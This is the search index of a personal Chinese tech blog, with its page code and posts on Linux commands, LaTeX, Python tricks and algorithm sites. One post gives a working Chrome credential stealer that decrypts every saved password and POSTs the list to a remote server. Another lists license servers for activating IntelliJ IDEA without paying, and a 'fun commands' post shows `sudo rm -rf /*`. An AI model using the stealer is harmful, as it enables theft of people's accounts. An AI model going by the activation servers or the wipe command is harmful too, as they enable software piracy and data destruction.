{"pages":[{"title":"","text":"mePlayer 切换主题","link":"/Listen/index.html"},{"title":"","text":"html { width: 100%; height: 100%; margin: 0; padding: 0; } body { margin: 0; padding: 0; background: #e6eaf1; } .container { width: 400px; margin: 120px auto 0; } .meplayer-container-mini { margin: 0 auto; } .meplayer-container { margin: 0 auto; } button { font-size: 14px; line-height: 30px; display: block; width: 120px; height: 30px; margin: 70px auto; text-align: center; color: #777; border: none; background-color: #fff; -webkit-appearance: none; -moz-appearance: none; appearance: none; }","link":"/Listen/main.css"},{"title":"","text":"mePlayer({ music: { src: './cryonmyshoulder.mp3', title: '温柔的暖风', author: '教书的先生', loop: true, cover: './avatar.jpg', lrc: '[00:24.600]温柔的晚风\\n[00:27.830]轻轻吹过 爱人的梦中\\n[00:36.690]温柔的晚风\\n[00:39.129]轻轻吹过 故乡的天空\\n[00:47.690]温柔的晚风\\n[00:50.749]轻轻吹过 城市的灯火\\n[00:59.119]今夜的晚风\\n[01:02.439]你去哪里 请告诉我\\n[01:08.249]\\n[01:10.879]温柔的晚风\\n[01:14.590]轻轻吹过 爱人的梦中\\n[01:22.179]温柔的晚风\\n[01:25.549]轻轻吹过 故乡的天空\\n[01:33.809]温柔的晚风\\n[01:37.539]轻轻地吹过 城市的灯火\\n[01:46.509]今夜的晚风\\n[01:49.919]你要去哪里 请告诉我\\n[01:56.419]\\n[02:37.140]温柔的晚风\\n[02:40.740]轻轻吹过 爱人的梦中\\n[02:49.060]温柔的晚风\\n[02:52.370]轻轻吹过 故乡的天空\\n[03:00.680]温柔的晚风\\n[03:03.860]轻轻吹过 城市的灯火\\n[03:12.190]今夜的晚风\\n[03:15.440]你要去哪里 请告诉我\\n[03:21.370]\\n[03:23.620]温柔的晚风\\n[03:27.090]轻轻吹过 爱人的梦中\\n[03:35.280]温柔的晚风\\n[03:39.570]轻轻吹过 故乡的天空\\n[03:47.620]温柔的晚风\\n[03:50.880]轻轻地吹过 城市的灯火\\n[03:59.180]今夜的晚风\\n[04:02.680]你要去哪里 请告诉我\\n[04:08.800]\\n[04:33.830]温柔的晚风\\n[04:37.350]请你带走 我昨天的梦\\n[04:45.350]今夜的晚风\\n[04:48.960]我要去哪里 请告诉我\\n[04:59.690]\\n' }, target: '.music', autoplay: false }) document.querySelector('button').addEventListener('click', function() { mePlayer.toggleTheme() }) window.setTimeout(mePlayer.play, 1500)","link":"/Listen/main.js"},{"title":"Download","text":"周志华论文内容演讲PPT Oneindex下载 蓝奏云下载 网盘(提取码：21yg )备用下载 知识图谱的关键技术及其智能应用 网盘(提取码：rhpa )下载 oneindex下载 简历模板 网盘(提取码：derk)下载 oneindex下载 机器学习知识点速查表 网盘(提取码：wr30 )下载 oneindex下载 微软VSstudio官方文档 网盘(提取码：a2s5 )下载 oneindex下载 Python微信表情图发送(微信老用户) oneindex下 《动手学习深度学习》官方中文PPT oneindex下载 统计基础系列 oneindex下载 python基础与进阶pdf oneindex下载","link":"/Download/index.html"},{"title":"User","text":"客户端下载 客户端直链下载oneindex下载","link":"/User/index.html"},{"title":"","text":"window.onresize = window.onload = function () { try { var panel = document.getElementById('panel'); if (document.documentElement.clientWidth < 768) { var h = document.documentElement.clientHeight - 50; panel.style.height = h + 'px'; }else { panel.style.removeProperty('height'); } } catch (e) { } }","link":"/Chat/index.html"},{"title":"","text":"#shuoshuo_content { background-color: #fff; padding: 10px; min-height: 500px; } /* shuo */ body.theme-dark .cbp_tmtimeline::before { background: RGBA(255, 255, 255, 0.06); } ul.cbp_tmtimeline { padding: 0; } div class.cdp_tmlabel > li .cbp_tmlabel { margin-bottom: 0; } .cbp_tmtimeline { margin: 30px 0 0 0; padding: 0; list-style: none; position: relative; } /* The line */ .cbp_tmtimeline:before { content: ''; position: absolute; top: 0; bottom: 0; width: 4px; background: RGBA(0, 0, 0, 0.02); left: 80px; margin-left: 10px; } /* The date/time */ .cbp_tmtimeline > li .cbp_tmtime { display: block; /* width: 29%; */ /* padding-right: 110px; */ max-width: 70px; position: absolute; } .cbp_tmtimeline > li .cbp_tmtime span { display: block; text-align: right; } .cbp_tmtimeline > li .cbp_tmtime span:first-child { font-size: 0.9em; color: #bdd0db; } .cbp_tmtimeline > li .cbp_tmtime span:last-child { font-size: 1.2em; color: #9BCD9B; } .cbp_tmtimeline > li:nth-child(odd) .cbp_tmtime span:last-child { color: RGBA(255, 125, 73, 0.75); } div.cbp_tmlabel > p { margin-bottom: 0; } /* Right content */ .cbp_tmtimeline > li .cbp_tmlabel { margin: 0 0 45px 65px; background: #9BCD9B; color: #fff; padding: .8em 1.2em .4em 1.2em; /* font-size: 1.2em; */ font-weight: 300; line-height: 1.4; position: relative; border-radius: 5px; transition: all 0.3s ease 0s; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.15); cursor: pointer; display: block; } .cbp_tmlabel:hover { /* transform:scale(1.05); */ transform: translateY(-3px); z-index: 1; -webkit-box-shadow: 0 15px 32px rgba(0, 0, 0, 0.15) !important } .cbp_tmtimeline > li:nth-child(odd) .cbp_tmlabel { background: RGBA(255, 125, 73, 0.75); } /* The triangle */ .cbp_tmtimeline > li .cbp_tmlabel:after { right: 100%; border: solid transparent; content: \" \"; height: 0; width: 0; position: absolute; pointer-events: none; border-right-color: #9BCD9B; border-width: 10px; top: 4px; } .cbp_tmtimeline > li:nth-child(odd) .cbp_tmlabel:after { border-right-color: RGBA(255, 125, 73, 0.75); } p.shuoshuo_time { margin-top: 10px; border-top: 1px dashed #fff; padding-top: 5px; } /* Media */ @media screen and (max-width: 65.375em) { .cbp_tmtimeline > li .cbp_tmtime span:last-child { font-size: 1.2em; } } .shuoshuo_author_img img { border: 1px solid #ddd; padding: 2px; float: left; border-radius: 64px; transition: all 1.0s; } .avatar { -webkit-border-radius: 100% !important; -moz-border-radius: 100% !important; box-shadow: inset 0 -1px 0 #3333sf; -webkit-box-shadow: inset 0 -1px 0 #3333sf; -webkit-transition: 0.4s; -webkit-transition: -webkit-transform 0.4s ease-out; transition: transform 0.4s ease-out; -moz-transition: -moz-transform 0.4s ease-out; } .zhuan { transform: rotateZ(720deg); -webkit-transform: rotateZ(720deg); -moz-transform: rotateZ(720deg); } /* end */ 做一个没有感情的刷题机器~ 2019年10月11日 如果你想要成功,你就要付出更多的努力 2019年9月17日 (function () { var oldClass = \"\"; var Obj = \"\"; $(\".cbp_tmtimeline li\").hover(function () { Obj = $(this).children(\".shuoshuo_author_img\"); Obj = Obj.children(\"img\"); oldClass = Obj.attr(\"class\"); var newClass = oldClass + \" zhuan\"; Obj.attr(\"class\", newClass); }, function () { Obj.attr(\"class\", oldClass); }) })","link":"/say/index.html"},{"title":"Wechat","text":"微信公众号 微信小程序","link":"/Wechat/index.html"},{"title":"About","text":"博主姓名:王荣胜 就读:河南理工大学本科生 联系方式: QQ:603329354 QQ交流群:843108406 邮箱:603329354@qq.com 想更加了解我,请转至:我的主页-教书的先生 我深信不疑的就是:他们以梦为马,我偏以码为梦 我经常出没在以下地区： 版权声明 博客内的所有原创内容（包括但不限于文章、图像等）除特别声明外均采用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议，任何人都可以自由传播，但不得用于商用且必须署名并以相同方式分享。 本站部分内容转载于网络，有出处的已在文中署名作者并附加原文链接，出处已不可寻的皆已标注来源于网络，若您认为本博客有部分内容侵犯了您的版权，请电邮告知，我将认真处理。 免责声明本博客提供的所有内容仅供学习、分享与交流，并且不保证内容的正确性。通过使用本站内容随之而来的风险与本站无关。当使用本站时，代表你已接受本站的免责声明和隐私原则等条款。 隐私原则本站内目前涉及到浏览者隐私的只有一个地方，就是留言区（文章评论）。当你留言时，你的电子邮箱、Cookies信息和IPv4/IPv6地址都会被记录。这些信息仅为了改进我们的网站质量和可能的交流沟通。我们不会将这些信息进行展示、出租或出售给任何人。但以下情况除外： 只有透露您的个人资料，才能提供您所要求的产品和服务； 我们需要听从法庭传票、法律命令或遵循法律程序； 我们发现您违反了本站已发布的条款或声明。","link":"/about/index.html"}],"posts":[{"title":"好玩的Linux命令","text":"注：本文命令均实验于Ubuntu桌面系统环境 1.追鼠标的小猫12sudo apt-get install onekooneko 注意，本命令只能在桌面所在的命令行界面输入，在远程ssh界面会显示“oneko:Can’t open display” 2.炫酷仪表盘123456sudo apt-get install npmsudo apt install nodejs-legacygit clone https://github.com/yaronn/blessed-contrib.gitcd blessed-contribnpm installnode ./examples/dashboard.js 3.图片转ASCII画风123sudo apt-get install aview imagemagickwget http://labfile.oss.aliyuncs.com/courses/1/Linus.pngasciiview Linus.png 4.ASCII艺术框1234sudo apt-get install boxesecho \"Tongji Univerisity\" | boxesecho \"Tongji Univerisity\" | boxes -d dogfortune | boxes -d cat | lolcat 5.字符串起火12sudo apt-get install libaa-binaafire 6.呜呜呜小火车12sudo apt-get install slsl-h 7.终极解君忧命令！1sudo rm -rf /* sudo：获取root管理员权限 rm：remove，即删除 rf：r表示递归删除，即删除所有的子目录，f表示不需要再进行确认 /：根目录 *：所有文件 执行效果： 友情郑重提示：千万不要轻易尝试这个命令，特别是在运行有网站服务器、数据库的Linux主机上！","link":"/2019/11/13/好玩的Linux命令/"},{"title":"Intellij Idea免费激活使用（2017.1.1版本）","text":"IDEA 全称 IntelliJ IDEA，是java编程语言开发的集成环境。IntelliJ在业界被公认为最好的java开发工具，尤其在智能代码助手、代码自动提示、重构、J2EE支持、各类版本工具(git、svn等)、JUnit、CVS整合、代码分析、 创新的GUI设计等方面的功能可以说是超常的。IDEA是JetBrains公司的产品，这家公司总部位于捷克共和国的首都布拉格，开发人员以严谨著称的东欧程序员为主。它的旗舰版本还支持HTML，CSS，PHP，MySQL，Python等。免费版只支持Python等少数语言。 这里的安装的是Intellij Idea的2017年1月1日的版本。 一、简易安装方法1.下载网盘下载 提取码：anwm 2.安装 3.激活 填入下面任意的一个license server: http://intellij.mandroid.cn/ http://idea.iblue.me/ http://idea.imsxm.com/ http://idea.iteblog.com/key.php 二、精细安装参考文章","link":"/2019/11/11/Intellij-Idea免费激活使用（2017-1-1版本）/"},{"title":"LaTex的安装和使用","text":"LaTeX是一个专门的排版软件，很多科学出版社都是用这个软件。 一、安装Texlive1.下载官网下载 2.安装解压后点击运行程序 在线安装三个多G，有点慢，可以做点别的事情 二、安装texstudio1.下载官网下载 直接download，然后安装 2.使用修改语言： Options—-Configure TexStudio…—-General—-Language—-zh_CN 命令里正常的，如果不一样需要手动修改： 三、学习使用文档官方使用文档：https://www.latex-project.org/help/links/ b站配套安装视频：https://www.bilibili.com/video/av40903112/","link":"/2019/11/10/LaTex的安装和使用/"},{"title":"获取所有谷歌浏览器上保存的密码","text":"使用谷歌浏览器都知道，非常人性化的一方面就是记住我们在某些网站登录的账号和密码，并且自动填写，那么我们将利用py获取谷歌浏览器上保存的所有账号和密码，对于此程序原身为黑客盗号软件，经过我的改写，它将不会这么邪恶。 简易版代码123456789101112131415161718192021222324252627# -*- coding: utf-8 -*-# @Author : 王荣胜# @Blog : https://sqdxwz.top# @Date : 2019/11/09 10:20# Software : IDLE# version：Python 3.6.6import osimport shutilimport sqlite3import win32cryptdb_file_path = os.path.join(os.environ['LOCALAPPDATA'], r'Google\\Chrome\\User Data\\Default\\Login Data')tmp_file = os.path.join(os.environ['LOCALAPPDATA'], 'sqlite_file')print(tmp_file)if os.path.exists(tmp_file): os.remove(tmp_file)shutil.copyfile(db_file_path, tmp_file)conn = sqlite3.connect(tmp_file)for row in conn.execute('select signon_realm,username_value,password_value from logins'): ret = win32crypt.CryptUnprotectData(row[2], None, None, None, 0) print('网站：%-50s，用户名：%-20s，密码：%s' % (row[0][:50], row[1], ret[1].decode('gbk')))conn.close()os.remove(tmp_file) 完整进阶版代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960# -*- coding: utf-8 -*-# @Author : 王荣胜# @Blog : https://sqdxwz.top# @Date : 2019/11/09 10:20# Software : IDLE# version：Python 3.6.6import osimport shutilimport sqlite3import win32cryptimport jsonimport requestsAPP_DATA_PATH = os.environ[\"LOCALAPPDATA\"]DB_PATH = r'Google\\Chrome\\User Data\\Default\\Login Data'class ChromePassword: def __init__(self): self.passwordsList = [] def get_chrome_db(self): _full_path = os.path.join(APP_DATA_PATH, DB_PATH) _tmp_file = os.path.join(os.environ['LOCALAPPDATA'], 'sqlite_file') if os.path.exists(_tmp_file): os.remove(_tmp_file) shutil.copyfile(_full_path, _tmp_file) self.show_passwords(_tmp_file) def show_passwords(self, db_file): conn = sqlite3.connect(db_file) _sql = '''select signon_realm,username_value,password_value from logins''' for row in conn.execute(_sql): ret = win32crypt.CryptUnprotectData(row[2], None, None, None, 0) # 密码解析后得到的是字节码，需要进行解码操作 _info = 'url: %-40s username: %-20s password: %s\\n' % \\ (row[0][:50], row[1], ret[1].decode()) self.passwordsList.append(_info) conn.close() os.remove(db_file) def save_passwords(self): with open('password.txt', 'w', encoding='utf-8') as f: f.writelines(self.passwordsList) def transfer_passwords(self): try: # 此处填写远端Flask对应的IP:PORT requests.post('http://192.168.1.102:9999/index', data=json.dumps(self.passwordsList)) except requests.exceptions.ConnectionError: passif __name__ == '__main__': Main = ChromePassword() Main.get_chrome_db() Main.save_passwords() Main.transfer_passwords() 运行显示","link":"/2019/11/09/获取所有谷歌浏览器上保存的密码/"},{"title":"Github Pages设置自定义域名","text":"今日想来，我手下也有6个域名了，不如给我的Hexo+Github建立的博客换上一个域名吧。 新域名在这：https://sqdxwz.top 把自定义域名的步骤进行记录-三步设置自定义域名。 1.获取博客的ip地址首先是用ping命令找到存放你的github pages的主机的IP地址，在终端里面用命令ping xxx.github.io便可完成，下图中红框内的就是我们要找的IP地址： 2.域名解析在购买域名的提供商为域名添加解析。我是在阿里云买的域名，因此我以阿里云的为例。在域名控制台选择想要绑定的域名，并点击解析： 然后添加如下两条记录： 3.Github仓库设置在Github中，找到托管博客的xxx.github.io项目： 进入到设置页面，并滑动到下方，找到Github Pages这一栏，在Custom Domain填上刚刚添加解析的域名并保存： 到这儿就已经完成了，等待10分钟后就可以使用自定义的域名访问github pages所提供的页面了。 4.后续如果你不想每次在hexo g -d 后都重新设置下域名。 你可以在本地的source文件 下添加一个CNAME文件 ，里面填写自己的自定义域名就好了。","link":"/2019/11/09/Github-Pages设置自定义域名/"},{"title":"搜索引擎之高级搜索","text":"普通搜索可以满足基本的需求，特殊搜索一直都是网站SEO的必修课。 介绍下搜索方法的高级搜索方法，之前在某平台看到过，没太在意，如今再次被人提起，就整理下。 1.site：site是最常用的搜索指令，它是用来搜索某个域名下的所有文件(注意：文件须是搜索引擎收录的文件)。 2.双引号把搜索词放在双引号，代表完全匹配搜索。搜索结果返回的页面包含双引号中出现的所有词，连顺序也必须完全匹配。百度和谷歌都支持这个指令。 3.减号减号(-)代表搜索不包含减号后面的词的页面。 注意：减号前面有空格而后面没有空格，紧跟着需要排除的词。百度和谷歌都支持这个指令。 4.星号星号(*)在计算机里的术语叫通配符，就是匹配全部的意思。百度不支持*号搜索指令。比如在Google中搜索”郭*纲”，其中*号代表了任何文字。返回的结果不仅包含了郭德纲，还包含了其他。 5.inulr：inurl:指令用于搜索查询词出现在URL(链接)中的页面。 6.inanchor：这个指令返回的结果是导入链接锚文字中包含搜索词的页面，百度不支持该指令。这个指令可以帮助SEOer去研究竞争对手页面有哪些外链，可以找到很多行业外链资源平台。 7.intitle：该指令返回的是页面title中包含关键词的页面。百度和Google都支持该指令。SEOer都会把关键词放进Title中，因此使用intitle指令找到的文件才是更准确的竞争页面。而没有出现在title中的大部分是并没有针对关键词进行优化，也不是有力的竞争对手。 8.alltitle：该标签返回的结果是页面标题中包含多组关键词的文件，如：alltitle:SEO搜索引擎优化就相当于intitle:SEO intitle:搜索引擎优化返回的是标题中既包含”SEO”也包含”搜索引擎优化”的页面。 9.allinurl：与alltitle类似。allurl:SEO搜索引擎优化就相当于iknurl:SEO inurl:搜索引擎优化。 10.filetype：该指令用于特定的文件格式。百度和Google都支持该指令。 11.link：link是以前SEO常用的指令，用来搜索某个url的反向链接，既包括内部链接，也包括外部链接。但是现在Google对这个指令只返回其索引库中的一部分，而且是近乎随机的一部分，所以用这个指令查反链几乎没有用。百度则不支持该指令。 12.linkdomain：该指令曾经是SEOer必用的外链查询工具，随着雅虎放弃自己的搜索技术，这个指令已经作废。这个指令只适用于雅虎。 13.related：该指令只适用于Google，返回的结果是与某个网站有关联的页面。这种关联到底指的是什么，Google并没有明确说明，一般认为指的是有共同外部链接的网站。","link":"/2019/11/09/搜索引擎之高级搜索/"},{"title":"Python实现​旋转描记器","text":"旋转描记器是一种几何绘图玩具，可产生各种技术上称为下摆线和下摆线的数学轮盘曲线。它是由英国工程师Denys Fisher开发的，于1965年首次出售。该名称是1998年Hasbro 公司（Hasbro Inc.）的注册商标，此前该公司 收购了Denys Fisher公司。Spirograph品牌于2013年由Kahootz Toys在全球范围内重新推出其原始产品配置，旋描仪可用于绘制各种分形。 对于数学部分，您可以参考Wiki：https://en.wikipedia.org/wiki/Spirograph#Mathematical_basis 代码实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246#importing the required libraries import random, argparse import math import turtle from PIL import Image from datetime import datetime from fractions import gcd # A class that draws a spirograph class Spiro: # constructor def __init__(self, xc, yc, col, R, r, l): # create own turtle self.t = turtle.Turtle() # set cursor shape self.t.shape('turtle') # set step in degrees self.step = 5 # set drawing complete flag self.drawingComplete = False # set parameters self.setparams(xc, yc, col, R, r, l) # initiatize drawing self.restart() # set parameters def setparams(self, xc, yc, col, R, r, l): # spirograph parameters self.xc = xc self.yc = yc self.R = int(R) self.r = int(r) self.l = l self.col = col # reduce r/R to smallest form by dividing with GCD gcdVal = gcd(self.r, self.R) self.nRot = self.r//gcdVal # get ratio of radii self.k = r/float(R) # set color self.t.color(*col) # current angle self.a = 0 # restart drawing def restart(self): # set flag self.drawingComplete = False # show turtle self.t.showturtle() # go to first point self.t.up() R, k, l = self.R, self.k, self.l a = 0.0 x = R*((1-k)*math.cos(a) + l*k*math.cos((1-k)*a/k)) y = R*((1-k)*math.sin(a) - l*k*math.sin((1-k)*a/k)) self.t.setpos(self.xc + x, self.yc + y) self.t.down() # draw the whole thing def draw(self): # draw rest of points R, k, l = self.R, self.k, self.l for i in range(0, 360*self.nRot + 1, self.step): a = math.radians(i) x = R*((1-k)*math.cos(a) + l*k*math.cos((1-k)*a/k)) y = R*((1-k)*math.sin(a) - l*k*math.sin((1-k)*a/k)) self.t.setpos(self.xc + x, self.yc + y) # done - hide turtle self.t.hideturtle() # update by one step def update(self): # skip if done if self.drawingComplete: return # increment angle self.a += self.step # draw step R, k, l = self.R, self.k, self.l # set angle a = math.radians(self.a) x = self.R*((1-k)*math.cos(a) + l*k*math.cos((1-k)*a/k)) y = self.R*((1-k)*math.sin(a) - l*k*math.sin((1-k)*a/k)) self.t.setpos(self.xc + x, self.yc + y) # check if drawing is complete and set flag if self.a &gt;= 360*self.nRot: self.drawingComplete = True # done - hide turtle self.t.hideturtle() # clear everything def clear(self): self.t.clear() # A class for animating spirographs class SpiroAnimator: # constructor def __init__(self, N): # timer value in milliseconds self.deltaT = 10 # get window dimensions self.width = turtle.window_width() self.height = turtle.window_height() # create spiro objects self.spiros = [] for i in range(N): # generate random parameters rparams = self.genRandomParams() # set spiro params spiro = Spiro(*rparams) self.spiros.append(spiro) # call timer turtle.ontimer(self.update, self.deltaT) # restart sprio drawing def restart(self): for spiro in self.spiros: # clear spiro.clear() # generate random parameters rparams = self.genRandomParams() # set spiro params spiro.setparams(*rparams) # restart drawing spiro.restart() # generate random parameters def genRandomParams(self): width, height = self.width, self.height R = random.randint(50, min(width, height)//2) r = random.randint(10, 9*R//10) l = random.uniform(0.1, 0.9) xc = random.randint(-width//2, width//2) yc = random.randint(-height//2, height//2) col = (random.random(), random.random(), random.random()) return (xc, yc, col, R, r, l) def update(self): # update all spiros nComplete = 0 for spiro in self.spiros: # update spiro.update() # count completed ones if spiro.drawingComplete: nComplete+= 1 # if all spiros are complete, restart if nComplete == len(self.spiros): self.restart() # call timer turtle.ontimer(self.update, self.deltaT) # toggle turtle on/off def toggleTurtles(self): for spiro in self.spiros: if spiro.t.isvisible(): spiro.t.hideturtle() else: spiro.t.showturtle() # save spiros to image def saveDrawing(): # hide turtle turtle.hideturtle() # generate unique file name dateStr = (datetime.now()).strftime(\"%d%b%Y-%H%M%S\") fileName = 'spiro-' + dateStr print('saving drawing to %s.eps/png' % fileName) # get tkinter canvas canvas = turtle.getcanvas() # save postscipt image canvas.postscript(file = fileName + '.eps') # use PIL to convert to PNG img = Image.open(fileName + '.eps') img.save(fileName + '.png', 'png') # show turtle turtle.showturtle() # main() function def main(): # use sys.argv if needed print('generating spirograph...') # create parser descStr = \"\"\"This program draws spirographs using the Turtle module. When run with no arguments, this program draws random spirographs. Terminology: R: radius of outer circle. r: radius of inner circle. l: ratio of hole distance to r. \"\"\" parser = argparse.ArgumentParser(description=descStr) # add expected arguments parser.add_argument('--sparams', nargs=3, dest='sparams', required=False, help=\"The three arguments in sparams: R, r, l.\") # parse args args = parser.parse_args() # set to 80% screen width turtle.setup(width=0.8) # set cursor shape turtle.shape('turtle') # set title turtle.title(\"Spirographs!\") # add key handler for saving images turtle.onkey(saveDrawing, \"s\") # start listening turtle.listen() # hide main turtle cursor turtle.hideturtle() # checks args and draw if args.sparams: params = [float(x) for x in args.sparams] # draw spirograph with given parameters # black by default col = (0.0, 0.0, 0.0) spiro = Spiro(0, 0, col, *params) spiro.draw() else: # create animator object spiroAnim = SpiroAnimator(4) # add key handler to toggle turtle cursor turtle.onkey(spiroAnim.toggleTurtles, \"t\") # add key handler to restart animation turtle.onkey(spiroAnim.restart, \"space\") # start turtle main loop turtle.mainloop() # call main if __name__ == '__main__': main() 实现效果：","link":"/2019/11/09/Python实现​旋转描记器/"},{"title":"提取ipynb文件中的py代码","text":".ipynb是Anaconda3中Jupyter Notebook的文件格式，非常方便Python教学，在科学计算和数据分析等领域使用较多。在Jupyter Notebook中，使用菜单File==&gt;Download as==&gt;Python(.py)可以直接另存为.py文件，但是如果已经存在.ipynb文件该怎么去获得python代码呢？ 当我们利用记事本打开.ipynb文件时，会发现文件的格式跟json文件是一样的。这样的话可以使用Python标准库json进行解析，然后提取其中的Python代码。 参考代码： 12345678import jsonwith open(\"你的文件名称.ipynb\",encoding=\"utf-8\") as fp: content = json.load(fp)with open(\"保存的文件名称.py\",\"w\",encoding=\"utf-8\") as fp: for item in content[\"cells\"]: fp.writelines([i.rstrip()+\"\\n\" for i in item[\"source\"]])","link":"/2019/11/08/提取ipynb文件中的py代码/"},{"title":"算法刷题网站","text":"最近一直想刷题，经过苦苦寻找，找到了以下几个较好的平台，然后记录在这里吧。 一、收割offer版1.力扣英文网址：https://leetcode.com/ 中文网址：https://leetcode-cn.com/ 估计 leetcode（力扣）大家都很熟悉了，都被推荐烂了，很多国内外的程序员在上面刷题，难度从 Easy、Medium 至 Hard 都有，据说很多面试官都会从中挑选各种题目，号称大厂的筛码工。 2.hihoCoder网址：https://hihocoder.com 网站的技术团队来自于原北大 POJ 的开发团队，至于 POJ 会在后面的篇章中介绍，反正膜拜就完事了。一些知名的大厂比如微软、百度、腾讯、网易等会在上面举办在线编程比赛，风格倒是和 ACM 比赛类似。 3.牛客网网址：https://www.nowcoder.com/ 牛客网作为国内内容超级丰富的 IT 题库，各种东西看的我眼花缭乱，题库+面试+学习+求职+讨论 360 度无死角服务，堪称”互联网求职神器”。它好就好在不只是一个刷题的平台，还是一个交流学习的平台，发个问题贴总有热心的大佬帮助。 计蒜客网址：https://www.jisuanke.com/ 计蒜客这个网站可能很多人不知道，它也有可以刷题的题库，也会定期举办比赛。 二、ACM 竞赛版1.HDU网址：http://acm.hdu.edu.cn/ 杭电（杭州电子科技大学）的 OJ 大概是国内最火的几个 OJ 之一了，大多数 ACMer 应该都知道（其实我想说所有来着），勿需多说，非常多比赛都在上面，比如每年暑假的多校联赛，朝鲜、外蒙等学校的队伍都会参加，想不知道都不可能。 2.POJ网址：http://poj.org/ POJ（Peking University Online Judge）,同样作为国内最火的几大 OJ 之一，它的建立时间更早，一些上古时期的题目也能在上面找到，同样 POJ 也很出名。 3.SDUT网址：https://acm.sdut.edu.cn/ 4.其它 OJ最后附带一些其它同样优秀的 OJ 平台： 国内： ZJU（浙大）: https://zoj.pintia.cn/home USTC（中科大）：http://acm.ustc.edu.cn/ustcoj/ FZU（福大）：http://acm.fzu.edu.cn/ HIT（哈工大）：http://acm.hit.edu.cn/ 国外： URAL：http://acm.timus.ru/ SPOJ：https://www.spoj.com/ 三、提高版1.Codeforces网址：https://codeforces.com/ Codeforces 又被戏称为 CF，是一家俄罗斯的网站，当然还是用英文食用。这里的很好的比赛，很好的题目，很好的选手，简称”三好”。 2.Topcoder网址：https://www.topcoder.com/ Topcoder 据说是世界上规模最大的编程网站，如果这样的话那这个 Top 就可以理解了，Top 的 coder。 四、写在最后刷题不要单纯的为了追求做题的数量，还是要以学会为目的，并且学以致用。","link":"/2019/11/08/算法刷题网站/"},{"title":"对自己的python代码加密","text":"由于 Python 的动态特性和开源特点，导致 Python 代码很难做到很好的加密。社区中的一些声音认为这样的限制是事实，应该通过法律手段而不是加密源码达到商业保护的目的；而还有一些声音则是不论如何都希望能有一种手段来加密。于是乎，人们想出了各种或加密、或混淆的方案，借此来达到保护源码的目的。 常见的源码保护手段有如下几种： 发行.pyc文件 代码混淆 使用py2exe 使用Cython 下面来简单说说这些方案。 1.发行.pyc 文件生产.pyc文件： 1python -m compileall 文件名称 解密.pyc文件： 首先安装uncompyle6 库，然后在同文件下执行： 1uncompyle6 -o . 文件名 批量解密.pyc文件： 12345678910111213141516# encoding=utf8import osimport uncompyle6from uncompyle6 import decompile_filedef main(): path = 'C:\\filename'.decode('utf8') # Windows下 for root, dirs, files in os.walk(path): if root != path: break for filename in files: if filename.endswith('pyc'): print filename os.system('uncompyle6 -o . %s'%filename) if __name__ == '__main__': main() 优点： 简单方便，提高了一点源码破解门槛 平台兼容性好，.py能在哪里运行，.pyc就能在哪里运行 不足： 解释器兼容性差，.pyc只能在特定版本的解释器上运行 有现成的反编译工具，破解成本低 2.代码混淆 网站混淆：http://pyob.oxyry.com/ 使用 pyobfuscate 库进行混淆 优点： 简单方便，提高了一点源码破解门槛 兼容性好，只要源码逻辑能做到兼容，混淆代码亦能 不足： 只能对单个文件混淆，无法做到多个互相有联系的源码文件的联动混淆 代码结构未发生变化，也能获取字节码，破解难度不大 3.使用py2exepy2exe 是一款将 Python 脚本转换为 Windows 平台上的可执行文件的工具。其原理是将源码编译为.pyc文件，加之必要的依赖文件，一起打包成一个可执行文件。 使用py2exe进行打包的步骤较为简便。 1）编写入口文件。本示例中取名为hello.py： 1print 'Hello World' 2）编写setup.py： 1234from distutils.core import setupimport py2exesetup(console=['hello.py']) 3）生成可执行文件 1python setup.py py2exe 生成的可执行文件位于dist\\hello.exe 优点： 能够直接打包成 exe，方便分发和执行 破解门槛比 .pyc 更高一些 不足： 兼容性差，只能运行在 Windows 系统上 生成的可执行文件内的布局是明确、公开的，可以找到源码对应的.pyc文件，进而反编译出源码 4.使用 Cython使用Cython进行开发的步骤也不复杂。 1）编写文件hello.pyx或hello.py： 12def hello(): print('hello') 2）编写setup.py： 12345from distutils.core import setupfrom Cython.Build import cythonizesetup(name='Hello World app', ext_modules=cythonize('hello.pyx')) 3）编译为.c，再进一步编译为.so或.pyd： 1python setup.py build_ext --inplace 执行python -c “from hello import hello;hello()”即可直接引用生成的二进制文件中的hello()函数。 优点： 生成的二进制 .so 或 .pyd 文件难以破解 同时带来了性能提升 不足： 兼容性稍差，对于不同版本的操作系统，可能需要重新编译 虽然支持大多数 Python 代码，但如果一旦发现部分代码不支持，完善成本较高","link":"/2019/11/05/对自己的python代码加密/"},{"title":"[转]推荐系统入门经验","text":"自学推荐系统两年多了，也阅读了一些相关的书籍和论文，但毕竟还没有实际的在公司做过推荐相关项目，所以说跟大佬们相比，还是有很多差距的。不过，在入门推荐的道路上，有一些经验和资料还是可以分享给你的，希望本文能够对你有所帮助。 1、第一阶段 - 掌握机器学习基础知识，打好基础学习推荐系统，还是要掌握一定的机器学习知识的，从特征获取、特征处理、特征选择，到基本的机器学习模型如逻辑回归、GBDT等等，都需要你熟练掌握。 其中比较重要的就是特征这块，因为推荐系统中会面临大量的离散特征，对离散特征的处理方式需要有一定的了解。 这里还是推荐李航博士的《统计学习方法第二版》。 然后就是神经网络，推荐系统中神经网络运用非常多，神经网络中基础的如循环神经网络、卷积神经网络，以及一些模型结构的搭建、训练的技巧如Dropout、BN等等也需要有所理解。 这个推荐吴恩达的深度学习课程以及李宏毅老师的深度学习课程。 2、第二阶段 - 阅读推荐系统经典书籍，入门推荐推荐系统市面上的书不是很多，而且写得往往不够深入，仅能够起到一定的入门作用，毕竟推荐在各个公司还是比较核心的内容，是比较受到保护的。但经典的书籍还是有的，入门的话推荐两本。 一是大家所熟知的《推荐系统实践》，这本的话对于大家了解推荐系统中最基本的算法如协同过滤、推荐系统中常用的评价指标、使用上下文和社交网络进行推荐、如何解决冷启动问题都有一定的帮助。 二是最近市面上新出现的《推荐系统开发实战》一书，虽然这本书我还没有看过，但不少的群友反映这本书对于入门推荐系统来说十分友好。理论和实战相结合，是挺不错的一本“小白实操书”。 